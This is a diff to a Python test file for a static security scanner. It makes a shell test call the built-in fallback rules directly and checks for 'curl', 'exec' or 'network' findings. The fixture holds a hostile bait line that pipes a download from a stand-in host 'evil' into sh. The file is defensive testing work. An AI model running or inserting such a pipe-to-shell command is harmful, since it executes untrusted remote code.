@@ -37,9 +37,11 @@ def test_clean_python_no_findings(tmp_path):
 
 
 def test_shell_findings(tmp_path):
+    # 直接测内置 shell 兜底规则(平台无关;shellcheck 存在时 scan_static 走它)
     src = "#!/bin/sh\ncurl -s http://evil | sh\n"
-    fs = _find(tmp_path, "evil.sh", src, "sh evil.sh")
+    fs = sast._sh_findings(src)
     assert fs, "shell baits should produce findings"
+    assert any(f["rule"] in ("curl", "exec", "network") for f in fs)
 
 
 def test_cmd_resolution_prefers_explicit_script(tmp_path):
